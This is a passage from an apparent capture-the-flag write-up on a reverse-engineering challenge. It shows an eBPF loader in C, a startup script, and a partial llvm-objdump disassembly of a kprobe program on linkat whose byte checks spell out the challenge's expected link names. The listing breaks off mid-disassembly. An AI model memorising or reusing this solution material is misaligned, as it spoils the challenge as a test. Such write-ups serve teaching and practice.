    <span class="n">obj</span> <span class="o">=</span> <span class="n">bpf_object__open_file</span><span class="p">(</span><span class="s">"/challenge/tracker.bpf.o"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">obj</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to open BPF object: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">err</span> <span class="o">=</span> <span class="n">bpf_object__load</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">err</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to load BPF object: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="o">-</span><span class="n">err</span><span class="p">));</span>
        <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">prog</span> <span class="o">=</span> <span class="n">bpf_object__find_program_by_name</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="s">"handle_do_linkat"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">prog</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Could not find BPF program handle_do_linkat</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">link</span> <span class="o">=</span> <span class="n">bpf_program__attach_kprobe</span><span class="p">(</span><span class="n">prog</span><span class="p">,</span> <span class="nb">false</span><span class="p">,</span> <span class="s">"__x64_sys_linkat"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">link</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to attach kprobe __x64_sys_linkat: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
        <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">signal</span><span class="p">(</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">handle_sigint</span><span class="p">);</span>
    <span class="n">signal</span><span class="p">(</span><span class="n">SIGTERM</span><span class="p">,</span> <span class="n">handle_sigint</span><span class="p">);</span>

    <span class="n">success</span> <span class="o">=</span> <span class="n">bpf_object__find_map_by_name</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="s">"success"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">success</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to find success map</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">map_fd</span> <span class="o">=</span> <span class="n">bpf_map__fd</span><span class="p">(</span><span class="n">success</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"Attached. Press Ctrl-C to quit.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
    <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="n">stop</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">__u32</span> <span class="n">v</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="n">map_fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">v</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">should_broadcast</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
            <span class="n">stop</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">usleep</span><span class="p">(</span><span class="mi">100000</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">should_broadcast</span><span class="p">)</span>
        <span class="n">broadcast_cheer</span><span class="p">();</span>

<span class="nl">cleanup:</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">link</span><span class="p">)</span>
        <span class="n">bpf_link__destroy</span><span class="p">(</span><span class="n">link</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">obj</span><span class="p">)</span>
        <span class="n">bpf_object__close</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">err</span> <span class="o">?</span> <span class="mi">1</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div></details> <details> <summary>Click to view <code>init-northpole.sh</code></summary><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c">#!/bin/sh</span>

<span class="nb">set</span> <span class="nt">-eu</span>

/challenge/northpole <span class="o">&gt;</span> /dev/null 2&gt;&amp;1 &amp;
</pre></table></code></div></div></details><p>The challenge presents us with a userspace binary <code class="language-plaintext highlighter-rouge">northpole</code> and an eBPF object file <code class="language-plaintext highlighter-rouge">tracker.bpf.o</code>.</p><ul><li><p><code class="language-plaintext highlighter-rouge">northpole</code> load the BPF object and attaches the eBPF program to the <code class="language-plaintext highlighter-rouge">linkat</code> syscall via kprobe.</p><li><p>Find a map called <code class="language-plaintext highlighter-rouge">success</code> inside the BPF object.</p><li><p>When <code class="language-plaintext highlighter-rouge">success[0] != 0</code>, it calls <code class="language-plaintext highlighter-rouge">broadcast_cheer()</code> to read the flag from <code class="language-plaintext highlighter-rouge">/flag</code> and write it to all open terminal(/dev/pts/*).</p></ul><p>With the hint <code class="language-plaintext highlighter-rouge">llvm-objdump</code>, we can disassemble the eBPF object file:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>llvm-objdump <span class="nt">-d</span> <span class="nt">-S</span> <span class="nt">-r</span> tracker.bpf.o <span class="o">&gt;</span> tracker.S
</pre></table></code></div></div><details> <summary>Click to view <code>tracker.S</code></summary><pre><code class="language-asm">
tracker.bpf.o:	file format elf64-bpf

Disassembly of section kprobe/__x64_sys_linkat:

0000000000000000 &lt;handle_do_linkat&gt;:
       0:	79 16 70 00 00 00 00 00	r6 = *(u64 *)(r1 + 0x70)
       1:	b7 01 00 00 00 00 00 00	r1 = 0x0
       2:	7b 1a d0 ff 00 00 00 00	*(u64 *)(r10 - 0x30) = r1
       3:	7b 1a c8 ff 00 00 00 00	*(u64 *)(r10 - 0x38) = r1
       4:	15 06 0e 01 00 00 00 00	if r6 == 0x0 goto +0x10e &lt;handle_do_linkat+0x898&gt;
       5:	bf 63 00 00 00 00 00 00	r3 = r6
       6:	07 03 00 00 68 00 00 00	r3 += 0x68
       7:	bf a1 00 00 00 00 00 00	r1 = r10
       8:	07 01 00 00 d0 ff ff ff	r1 += -0x30
       9:	b7 02 00 00 08 00 00 00	r2 = 0x8
      10:	85 00 00 00 71 00 00 00	call 0x71
      11:	07 06 00 00 38 00 00 00	r6 += 0x38
      12:	bf a1 00 00 00 00 00 00	r1 = r10
      13:	07 01 00 00 c8 ff ff ff	r1 += -0x38
      14:	b7 02 00 00 08 00 00 00	r2 = 0x8
      15:	bf 63 00 00 00 00 00 00	r3 = r6
      16:	85 00 00 00 71 00 00 00	call 0x71
      17:	79 a3 d0 ff 00 00 00 00	r3 = *(u64 *)(r10 - 0x30)
      18:	15 03 00 01 00 00 00 00	if r3 == 0x0 goto +0x100 &lt;handle_do_linkat+0x898&gt;
      19:	79 a1 c8 ff 00 00 00 00	r1 = *(u64 *)(r10 - 0x38)
      20:	15 01 fe 00 00 00 00 00	if r1 == 0x0 goto +0xfe &lt;handle_do_linkat+0x898&gt;
      21:	bf a1 00 00 00 00 00 00	r1 = r10
      22:	07 01 00 00 d8 ff ff ff	r1 += -0x28
      23:	b7 02 00 00 10 00 00 00	r2 = 0x10
      24:	85 00 00 00 72 00 00 00	call 0x72
      25:	67 00 00 00 20 00 00 00	r0 &lt;&lt;= 0x20
      26:	c7 00 00 00 20 00 00 00	r0 s&gt;&gt;= 0x20
      27:	b7 01 00 00 01 00 00 00	r1 = 0x1
      28:	6d 01 f6 00 00 00 00 00	if r1 s&gt; r0 goto +0xf6 &lt;handle_do_linkat+0x898&gt;
      29:	79 a3 d0 ff 00 00 00 00	r3 = *(u64 *)(r10 - 0x30)
      30:	bf a1 00 00 00 00 00 00	r1 = r10
      31:	07 01 00 00 f0 ff ff ff	r1 += -0x10
      32:	b7 02 00 00 10 00 00 00	r2 = 0x10
      33:	85 00 00 00 72 00 00 00	call 0x72
      34:	67 00 00 00 20 00 00 00	r0 &lt;&lt;= 0x20
      35:	77 00 00 00 20 00 00 00	r0 &gt;&gt;= 0x20
      36:	55 00 ee 00 07 00 00 00	if r0 != 0x7 goto +0xee &lt;handle_do_linkat+0x898&gt;
      37:	71 a1 f0 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0x10)
      38:	55 01 ec 00 73 00 00 00	if r1 != 0x73 goto +0xec &lt;handle_do_linkat+0x898&gt;
      39:	71 a1 f1 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xf)
      40:	55 01 ea 00 6c 00 00 00	if r1 != 0x6c goto +0xea &lt;handle_do_linkat+0x898&gt;
      41:	71 a1 f2 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xe)
      42:	55 01 e8 00 65 00 00 00	if r1 != 0x65 goto +0xe8 &lt;handle_do_linkat+0x898&gt;
      43:	71 a1 f3 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xd)
      44:	55 01 e6 00 69 00 00 00	if r1 != 0x69 goto +0xe6 &lt;handle_do_linkat+0x898&gt;
      45:	71 a1 f4 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xc)
      46:	55 01 e4 00 67 00 00 00	if r1 != 0x67 goto +0xe4 &lt;handle_do_linkat+0x898&gt;
      47:	71 a1 f5 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xb)
      48:	55 01 e2 00 68 00 00 00	if r1 != 0x68 goto +0xe2 &lt;handle_do_linkat+0x898&gt;
      49:	79 a3 c8 ff 00 00 00 00	r3 = *(u64 *)(r10 - 0x38)
      50:	bf a1 00 00 00 00 00 00	r1 = r10
      51:	07 01 00 00 d8 ff ff ff	r1 += -0x28
      52:	b7 02 00 00 10 00 00 00	r2 = 0x10
      53:	85 00 00 00 72 00 00 00	call 0x72
      54:	67 00 00 00 20 00 00 00	r0 &lt;&lt;= 0x20
      55:	c7 00 00 00 20 00 00 00	r0 s&gt;&gt;= 0x20
      56:	b7 01 00 00 01 00 00 00	r1 = 0x1
      57:	6d 01 d9 00 00 00 00 00	if r1 s&gt; r0 goto +0xd9 &lt;handle_do_linkat+0x898&gt;
      58:	79 a6 c8 ff 00 00 00 00	r6 = *(u64 *)(r10 - 0x38)
      59:	b7 07 00 00 00 00 00 00	r7 = 0x0
      60:	63 7a ec ff 00 00 00 00	*(u32 *)(r10 - 0x14) = r7
      61:	bf a2 00 00 00 00 00 00	r2 = r10
      62:	07 02 00 00 ec ff ff ff	r2 += -0x14
      63:	18 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00	r1 = 0x0 ll
		00000000000001f8:  R_BPF_64_64	progress
      65:	85 00 00 00 01 00 00 00	call 0x1
      66:	15 00 01 00 00 00 00 00	if r0 == 0x0 goto +0x1 &lt;handle_do_linkat+0x220&gt;
      67:	61 07 00 00 00 00 00 00	r7 = *(u32 *)(r0 + 0x0)
      68:	bf a1 00 00 00 00 00 00	r1 = r10
      69:	07 01 00 00 f0 ff ff ff	r1 += -0x10
      70:	b7 02 00 00 10 00 00 00	r2 = 0x10
      71:	bf 63 00 00 00 00 00 00	r3 = r6
      72:	85 00 00 00 72 00 00 00	call 0x72
      73:	67 00 00 00 20 00 00 00	r0 &lt;&lt;= 0x20
      74:	77 00 00 00 20 00 00 00	r0 &gt;&gt;= 0x20
      75:	55 00 0e 00 07 00 00 00	if r0 != 0x7 goto +0xe &lt;handle_do_linkat+0x2d0&gt;
      76:	71 a1 f0 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0x10)
      77:	55 01 0c 00 64 00 00 00	if r1 != 0x64 goto +0xc &lt;handle_do_linkat+0x2d0&gt;
      78:	71 a1 f1 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xf)
      79:	55 01 0a 00 61 00 00 00	if r1 != 0x61 goto +0xa &lt;handle_do_linkat+0x2d0&gt;
      80:	71 a1 f2 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xe)
      81:	55 01 08 00 73 00 00 00	if r1 != 0x73 goto +0x8 &lt;handle_do_linkat+0x2d0&gt;
      82:	71 a1 f3 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xd)
      83:	55 01 06 00 68 00 00 00	if r1 != 0x68 goto +0x6 &lt;handle_do_linkat+0x2d0&gt;
      84:	71 a1 f4 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xc)
      85:	55 01 04 00 65 00 00 00	if r1 != 0x65 goto +0x4 &lt;handle_do_linkat+0x2d0&gt;
      86:	71 a1 f5 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xb)
      87:	55 01 02 00 72 00 00 00	if r1 != 0x72 goto +0x2 &lt;handle_do_linkat+0x2d0&gt;
      88:	b7 01 00 00 01 00 00 00	r1 = 0x1
      89:	05 00 b0 00 00 00 00 00	goto +0xb0 &lt;handle_do_linkat+0x850&gt;
      90:	65 07 18 00 03 00 00 00	if r7 s&gt; 0x3 goto +0x18 &lt;handle_do_linkat+0x398&gt;
      91:	15 07 55 00 01 00 00 00	if r7 == 0x1 goto +0x55 &lt;handle_do_linkat+0x588&gt;
      92:	15 07 94 00 02 00 00 00	if r7 == 0x2 goto +0x94 &lt;handle_do_linkat+0x788&gt;
      93:	15 07 01 00 03 00 00 00	if r7 == 0x3 goto +0x1 &lt;handle_do_linkat+0x2f8&gt;
      94:	05 00 aa 00 00 00 00 00	goto +0xaa &lt;handle_do_linkat+0x848&gt;
      95:	bf a1 00 00 00 00 00 00	r1 = r10
      96:	07 01 00 00 f0 ff ff ff	r1 += -0x10
      97:	b7 02 00 00 10 00 00 00	r2 = 0x10
      98:	bf 63 00 00 00 00 00 00	r3 = r6
      99:	85 00 00 00 72 00 00 00	call 0x72
     100:	67 00 00 00 20 00 00 00	r0 &lt;&lt;= 0x20
     101:	77 00 00 00 20 00 00 00	r0 &gt;&gt;= 0x20
     102:	55 00 a2 00 06 00 00 00	if r0 != 0x6 goto +0xa2 &lt;handle_do_linkat+0x848&gt;
     103:	71 a1 f0 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0x10)
     104:	55 01 a0 00 76 00 00 00	if r1 != 0x76 goto +0xa0 &lt;handle_do_linkat+0x848&gt;
     105:	71 a1 f1 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xf)
     106:	55 01 9e 00 69 00 00 00	if r1 != 0x69 goto +0x9e &lt;handle_do_linkat+0x848&gt;
     107:	71 a1 f2 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xe)
     108:	55 01 9c 00 78 00 00 00	if r1 != 0x78 goto +0x9c &lt;handle_do_linkat+0x848&gt;
     109:	71 a1 f3 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xd)
     110:	55 01 9a 00 65 00 00 00	if r1 != 0x65 goto +0x9a &lt;handle_do_linkat+0x848&gt;
     111:	71 a1 f4 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xc)
     112:	55 01 98 00 6e 00 00 00	if r1 != 0x6e goto +0x98 &lt;handle_do_linkat+0x848&gt;
     113:	b7 01 00 00 04 00 00 00	r1 = 0x4
     114:	05 00 97 00 00 00 00 00	goto +0x97 &lt;handle_do_linkat+0x850&gt;
     115:	65 07 17 00 05 00 00 00	if r7 s&gt; 0x5 goto +0x17 &lt;handle_do_linkat+0x458&gt;
     116:	15 07 52 00 04 00 00 00	if r7 == 0x4 goto +0x52 &lt;handle_do_linkat+0x638&gt;
     117:	15 07 01 00 05 00 00 00	if r7 == 0x5 goto +0x1 &lt;handle_do_linkat+0x3b8&gt;
     118:	05 00 92 00 00 00 00 00	goto +0x92 &lt;handle_do_linkat+0x848&gt;
     119:	bf a1 00 00 00 00 00 00	r1 = r10
     120:	07 01 00 00 f0 ff ff ff	r1 += -0x10
     121:	b7 02 00 00 10 00 00 00	r2 = 0x10
     122:	bf 63 00 00 00 00 00 00	r3 = r6
     123:	85 00 00 00 72 00 00 00	call 0x72
     124:	67 00 00 00 20 00 00 00	r0 &lt;&lt;= 0x20
     125:	77 00 00 00 20 00 00 00	r0 &gt;&gt;= 0x20
     126:	55 00 8a 00 06 00 00 00	if r0 != 0x6 goto +0x8a &lt;handle_do_linkat+0x848&gt;
     127:	71 a1 f0 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0x10)
     128:	55 01 88 00 63 00 00 00	if r1 != 0x63 goto +0x88 &lt;handle_do_linkat+0x848&gt;
     129:	71 a1 f1 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xf)
     130:	55 01 86 00 75 00 00 00	if r1 != 0x75 goto +0x86 &lt;handle_do_linkat+0x848&gt;
     131:	71 a1 f2 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xe)
     132:	55 01 84 00 70 00 00 00	if r1 != 0x70 goto +0x84 &lt;handle_do_linkat+0x848&gt;
     133:	71 a1 f3 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xd)
     134:	55 01 82 00 69 00 00 00	if r1 != 0x69 goto +0x82 &lt;handle_do_linkat+0x848&gt;
     135:	71 a1 f4 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xc)
     136:	55 01 80 00 64 00 00 00	if r1 != 0x64 goto +0x80 &lt;handle_do_linkat+0x848&gt;
     137:	b7 01 00 00 06 00 00 00	r1 = 0x6
     138:	05 00 7f 00 00 00 00 00	goto +0x7f &lt;handle_do_linkat+0x850&gt;
     139:	15 07 4f 00 06 00 00 00	if r7 == 0x6 goto +0x4f &lt;handle_do_linkat+0x6d8&gt;
     140:	15 07 01 00 07 00 00 00	if r7 == 0x7 goto +0x1 &lt;handle_do_linkat+0x470&gt;
     141:	05 00 7b 00 00 00 00 00	goto +0x7b &lt;handle_do_linkat+0x848&gt;
     142:	bf a1 00 00 00 00 00 00	r1 = r10
     143:	07 01 00 00 f0 ff ff ff	r1 += -0x10
     144:	b7 02 00 00 10 00 00 00	r2 = 0x10
     145:	bf 63 00 00 00 00 00 00	r3 = r6
     146:	85 00 00 00 72 00 00 00	call 0x72
     147:	67 00 00 00 20 00 00 00	r0 &lt;&lt;= 0x20
     148:	77 00 00 00 20 00 00 00	r0 &gt;&gt;= 0x20
     149:	55 00 73 00 08 00 00 00	if r0 != 0x8 goto +0x73 &lt;handle_do_linkat+0x848&gt;
     150:	71 a1 f0 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0x10)
     151:	55 01 71 00 62 00 00 00	if r1 != 0x62 goto +0x71 &lt;handle_do_linkat+0x848&gt;
     152:	71 a1 f1 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xf)
     153:	55 01 6f 00 6c 00 00 00	if r1 != 0x6c goto +0x6f &lt;handle_do_linkat+0x848&gt;
     154:	71 a1 f2 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xe)
     155:	55 01 6d 00 69 00 00 00	if r1 != 0x69 goto +0x6d &lt;handle_do_linkat+0x848&gt;
     156:	71 a1 f3 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xd)
     157:	55 01 6b 00 74 00 00 00	if r1 != 0x74 goto +0x6b &lt;handle_do_linkat+0x848&gt;
     158:	71 a1 f4 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xc)
     159:	55 01 69 00 7a 00 00 00	if r1 != 0x7a goto +0x69 &lt;handle_do_linkat+0x848&gt;
     160:	71 a1 f5 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xb)
     161:	55 01 67 00 65 00 00 00	if r1 != 0x65 goto +0x67 &lt;handle_do_linkat+0x848&gt;
     162:	71 a1 f6 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xa)
     163:	55 01 65 00 6e 00 00 00	if r1 != 0x6e goto +0x65 &lt;handle_do_linkat+0x848&gt;
     164:	b7 01 00 00 08 00 00 00	r1 = 0x8
     165:	63 1a e8 ff 00 00 00 00	*(u32 *)(r10 - 0x18) = r1
     166:	b7 01 00 00 01 00 00 00	r1 = 0x1
     167:	63 1a f0 ff 00 00 00 00	*(u32 *)(r10 - 0x10) = r1
     168:	bf a2 00 00 00 00 00 00	r2 = r10
     169:	07 02 00 00 ec ff ff ff	r2 += -0x14
     170:	bf a3 00 00 00 00 00 00	r3 = r10
     171:	07 03 00 00 f0 ff ff ff	r3 += -0x10
     172:	18 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00	r1 = 0x0 ll
		0000000000000560:  R_BPF_64_64	success
     174:	b7 04 00 00 00 00 00 00	r4 = 0x0
     175:	85 00 00 00 02 00 00 00	call 0x2
     176:	05 00 5a 00 00 00 00 00	goto +0x5a &lt;handle_do_linkat+0x858&gt;
     177:	bf a1 00 00 00 00 00 00	r1 = r10
     178:	07 01 00 00 f0 ff ff ff	r1 += -0x10
     179:	b7 02 00 00 10 00 00 00	r2 = 0x10
     180:	bf 63 00 00 00 00 00 00	r3 = r6
     181:	85 00 00 00 72 00 00 00	call 0x72
     182:	67 00 00 00 20 00 00 00	r0 &lt;&lt;= 0x20
     183:	77 00 00 00 20 00 00 00	r0 &gt;&gt;= 0x20
     184:	55 00 50 00 07 00 00 00	if r0 != 0x7 goto +0x50 &lt;handle_do_linkat+0x848&gt;
     185:	71 a1 f0 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0x10)
     186:	55 01 4e 00 64 00 00 00	if r1 != 0x64 goto +0x4e &lt;handle_do_linkat+0x848&gt;
     187:	71 a1 f1 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xf)
     188:	55 01 4c 00 61 00 00 00	if r1 != 0x61 goto +0x4c &lt;handle_do_linkat+0x848&gt;
     189:	71 a1 f2 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xe)
     190:	55 01 4a 00 6e 00 00 00	if r1 != 0x6e goto +0x4a &lt;handle_do_linkat+0x848&gt;
     191:	71 a1 f3 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xd)
     192:	55 01 48 00 63 00 00 00	if r1 != 0x63 goto +0x48 &lt;handle_do_linkat+0x848&gt;
     193:	71 a1 f4 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xc)
     194:	55 01 46 00 65 00 00 00	if r1 != 0x65 goto +0x46 &lt;handle_do_linkat+0x848&gt;
     195:	71 a1 f5 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xb)
     196:	55 01 44 00 72 00 00 00	if r1 != 0x72 goto +0x44 &lt;handle_do_linkat+0x848&gt;
     197:	b7 01 00 00 02 00 00 00	r1 = 0x2
     198:	05 00 43 00 00 00 00 00	goto +0x43 &lt;handle_do_linkat+0x850&gt;
     199:	bf a1 00 00 00 00 00 00	r1 = r10
     200:	07 01 00 00 f0 ff ff ff	r1 += -0x10
     201:	b7 02 00 00 10 00 00 00	r2 = 0x10
     202:	bf 63 00 00 00 00 00 00	r3 = r6
     203:	85 00 00 00 72 00 00 00	call 0x72
     204:	67 00 00 00 20 00 00 00	r0 &lt;&lt;= 0x20
     205:	77 00 00 00 20 00 00 00	r0 &gt;&gt;= 0x20
     206:	55 00 3a 00 06 00 00 00	if r0 != 0x6 goto +0x3a &lt;handle_do_linkat+0x848&gt;
     207:	71 a1 f0 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0x10)
     208:	55 01 38 00 63 00 00 00	if r1 != 0x63 goto +0x38 &lt;handle_do_linkat+0x848&gt;
     209:	71 a1 f1 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xf)
     210:	55 01 36 00 6f 00 00 00	if r1 != 0x6f goto +0x36 &lt;handle_do_linkat+0x848&gt;
     211:	71 a1 f2 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xe)
     212:	55 01 34 00 6d 00 00 00	if r1 != 0x6d goto +0x34 &lt;handle_do_linkat+0x848&gt;
     213:	71 a1 f3 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xd)
     214:	55 01 32 00 65 00 00 00	if r1 != 0x65 goto +0x32 &lt;handle_do_linkat+0x848&gt;
     215:	71 a1 f4 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xc)
     216:	55 01 30 00 74 00 00 00	if r1 != 0x74 goto +0x30 &lt;handle_do_linkat+0x848&gt;
     217:	b7 01 00 00 05 00 00 00	r1 = 0x5
     218:	05 00 2f 00 00 00 00 00	goto +0x2f &lt;handle_do_linkat+0x850&gt;
     219:	bf a1 00 00 00 00 00 00	r1 = r10
     220:	07 01 00 00 f0 ff ff ff	r1 += -0x10
     221:	b7 02 00 00 10 00 00 00	r2 = 0x10
     222:	bf 63 00 00 00 00 00 00	r3 = r6
     223:	85 00 00 00 72 00 00 00	call 0x72
     224:	67 00 00 00 20 00 00 00	r0 &lt;&lt;= 0x20
     225:	77 00 00 00 20 00 00 00	r0 &gt;&gt;= 0x20
     226:	55 00 26 00 07 00 00 00	if r0 != 0x7 goto +0x26 &lt;handle_do_linkat+0x848&gt;
     227:	71 a1 f0 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0x10)
     228:	55 01 24 00 64 00 00 00	if r1 != 0x64 goto +0x24 &lt;handle_do_linkat+0x848&gt;
     229:	71 a1 f1 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xf)
     230:	55 01 22 00 6f 00 00 00	if r1 != 0x6f goto +0x22 &lt;handle_do_linkat+0x848&gt;
     231:	71 a1 f2 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xe)
     232:	55 01 20 00 6e 00 00 00	if r1 != 0x6e goto +0x20 &lt;handle_do_linkat+0x848&gt;
     233:	71 a1 f3 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xd)
     234:	55 01 1e 00 6e 00 00 00	if r1 != 0x6e goto +0x1e &lt;handle_do_linkat+0x848&gt;
     235:	71 a1 f4 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xc)
     236:	55 01 1c 00 65 00 00 00	if r1 != 0x65 goto +0x1c &lt;handle_do_linkat+0x848&gt;
     237:	71 a1 f5 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xb)
     238:	55 01 1a 00 72 00 00 00	if r1 != 0x72 goto +0x1a &lt;handle_do_linkat+0x848&gt;
     239:	b7 01 00 00 07 00 00 00	r1 = 0x7
     240:	05 00 19 00 00 00 00 00	goto +0x19 &lt;handle_do_linkat+0x850&gt;
     241:	bf a1 00 00 00 00 00 00	r1 = r10
     242:	07 01 00 00 f0 ff ff ff	r1 += -0x10
     243:	b7 02 00 00 10 00 00 00	r2 = 0x10
     244:	bf 63 00 00 00 00 00 00	r3 = r6
     245:	85 00 00 00 72 00 00 00	call 0x72
     246:	67 00 00 00 20 00 00 00	r0 &lt;&lt;= 0x20
     247:	77 00 00 00 20 00 00 00	r0 &gt;&gt;= 0x20
     248:	55 00 10 00 08 00 00 00	if r0 != 0x8 goto +0x10 &lt;handle_do_linkat+0x848&gt;
     249:	71 a1 f0 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0x10)
     250:	55 01 0e 00 70 00 00 00	if r1 != 0x70 goto +0xe &lt;handle_do_linkat+0x848&gt;
     251:	71 a1 f1 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xf)
     252:	55 01 0c 00 72 00 00 00	if r1 != 0x72 goto +0xc &lt;handle_do_linkat+0x848&gt;
     253:	71 a1 f2 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xe)
     254:	55 01 0a 00 61 00 00 00	if r1 != 0x61 goto +0xa &lt;handle_do_linkat+0x848&gt;
     255:	71 a1 f3 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xd)
     256:	55 01 08 00 6e 00 00 00	if r1 != 0x6e goto +0x8 &lt;handle_do_linkat+0x848&gt;
     257:	71 a1 f4 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xc)
